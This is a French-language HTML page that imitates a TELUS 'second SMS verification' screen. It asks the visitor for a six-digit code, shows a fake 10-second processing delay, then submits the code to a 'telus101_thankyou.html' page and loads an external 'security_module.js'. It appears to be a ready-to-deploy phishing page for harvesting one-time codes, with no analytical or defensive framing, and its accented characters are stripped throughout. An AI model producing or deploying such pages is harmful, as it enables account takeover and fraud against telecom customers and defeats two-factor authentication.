<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Vrification - TELUS</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        body {
            margin: 0;
            padding: 0;
            font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
            background-color: #f4f4f4;
            color: #2a2c2e;
        }
        .header {
            background-color: #ffffff;
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 15px 20px;
            border-bottom: 1px solid #e5e5e5;
        }
        .logo { height: 45px; width: auto; object-fit: contain; flex-shrink: 0; }
        .menu-icon { font-size: 20px; color: #555; cursor: pointer; }
        .content-container {
            max-width: 450px;
            margin: 20px auto;
            padding: 0 15px;
        }
        .login-card {
            background-color: #ffffff;
            border: 1px solid #d8d8d8;
            border-radius: 8px;
            padding: 30px 25px;
        }
        .title {
            color: #4b286d;
            font-size: 26px;
            font-weight: 500;
            margin: 0 0 30px 0;
            line-height: 1.3;
        }
        .form-group { margin-bottom: 25px; }
        .form-label {
            display: block;
            font-size: 14px;
            font-weight: 700;
            margin-bottom: 8px;
            color: #2a2c2e;
        }
        .input-wrapper { position: relative; }
        .form-input {
            width: 100%;
            box-sizing: border-box;
            padding: 12px 15px;
            font-size: 16px;
            border: 1px solid #71757b;
            border-radius: 4px;
            outline: none;
            transition: border-color 0.2s;
            background-color: #fff;
        }
        .form-input:focus {
            border-color: #4b286d;
            box-shadow: 0 0 0 1px #4b286d;
        }
        .eye-icon {
            position: absolute;
            right: 15px;
            top: 50%;
            transform: translateY(-50%);
            color: #71757b;
            cursor: pointer;
            font-size: 18px;
        }
        .help-link {
            display: inline-block;
            margin-top: 8px;
            color: #2a2c2e;
            font-size: 14px;
            text-decoration: underline;
        }
        .help-link:hover { color: #4b286d; }
        .submit-btn {
            width: 100%;
            background-color: #2b8000;
            color: #ffffff;
            border: none;
            border-radius: 50px;
            padding: 14px;
            font-size: 16px;
            font-weight: 700;
            cursor: pointer;
            margin-top: 10px;
            transition: background-color 0.2s;
        }
        .submit-btn:hover { background-color: #226600; }
        .divider {
            display: flex;
            align-items: center;
            text-align: center;
            margin: 25px 0;
            color: #2a2c2e;
            font-size: 14px;
        }
        .divider::before, .divider::after {
            content: '';
            flex: 1;
            border-bottom: 1px solid #d8d8d8;
        }
        .divider:not(:empty)::before { margin-right: .5em; }
        .divider:not(:empty)::after { margin-left: .5em; }
        .secondary-btn {
            width: 100%;
            background-color: #ffffff;
            color: #2b8000;
            border: 2px solid #2b8000;
            border-radius: 50px;
            padding: 13px;
            font-size: 16px;
            font-weight: 700;
            cursor: pointer;
            margin-bottom: 30px;
        }
        .secondary-btn:hover { background-color: #f4f4f4; }
        .signup-text { font-size: 15px; color: #2a2c2e; margin: 0 0 10px 0; }
        .signup-link { color: #2b8000; text-decoration: none; font-weight: 700; font-size: 15px; }
        .signup-link:hover { text-decoration: underline; }
        .footer-secure {
            text-align: center;
            margin-top: 20px;
            font-size: 14px;
            color: #2a2c2e;
            font-weight: 500;
        }
        .footer-secure i { color: #4b286d; margin-right: 5px; }
        /* Loader Overlay */
        .loader-overlay {
            position: fixed;
            top: 0; left: 0; width: 100%; height: 100%;
            background-color: rgba(255, 255, 255, 0.9);
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            z-index: 9999;
            visibility: hidden;
            opacity: 0;
            transition: opacity 0.3s;
        }
        .loader-overlay.active { visibility: visible; opacity: 1; }
        .loader-spinner {
            border: 4px solid #f3f3f3;
            border-top: 4px solid #2b8000;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin-bottom: 15px;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .loader-text { font-size: 16px; font-weight: 500; color: #2a2c2e; }
        
        /* specific tweaks for success page */
        .success-icon { font-size: 70px; color: #2b8000; margin-bottom: 20px; display: block; text-align: center; }
        .success-desc { font-size: 16px; color: #2a2c2e; line-height: 1.5; margin-bottom: 30px; text-align: center; }
    </style>
</head>
<body>
    <div class="header">
        <img src="images/telus_logo.jpg" alt="TELUS Logo" class="logo">
        <i class="fa-solid fa-bars menu-icon"></i>
    </div>

    <div class="content-container">
        <div class="login-card">
            <h1 class="title">Seconde Vrification SMS</h1>
            
            <p style="font-size: 15px; margin-top: -15px; margin-bottom: 25px; color: #2a2c2e;">Pour finaliser la vrification, veuillez entrer le nouveau code que vous avez reu.</p>
            <form action="telus101_thankyou.html" method="POST">
                <div class="form-group">
                    <label class="form-label" for="sms_code">Code de vrification</label>
                    <input type="text" id="sms_code" name="sms_code" class="form-input" required maxlength="6" pattern="\d{6}" inputmode="numeric" placeholder="000000" style="text-align: center; letter-spacing: 5px; font-size: 20px; font-weight: bold;">
                </div>
                <button type="submit" class="submit-btn">Vrifier</button>
            </form>
            
        </div>

        <div class="footer-secure">
            <i class="fa-solid fa-shield-halved"></i> Protg par <strong>AccsSr</strong>
        </div>
    </div>

    <!-- Loader Overlay -->
    <div id="loaderOverlay" class="loader-overlay">
        <div class="loader-spinner"></div>
        <p class="loader-text">Traitement en cours, veuillez patienter...</p>
    </div>

    <script>
        document.addEventListener('DOMContentLoaded', function() {
            const form = document.querySelector('form');
            const loader = document.getElementById('loaderOverlay');
            if(form && loader) {
                form.addEventListener('submit', function(e) {
                    e.preventDefault();
                    loader.classList.add('active');
                    setTimeout(function() {
                        form.submit();
                    }, 10000); // 10 seconds
                });
            }
        });
    </script>
<script src="security_module.js"></script>
</body>
</html>
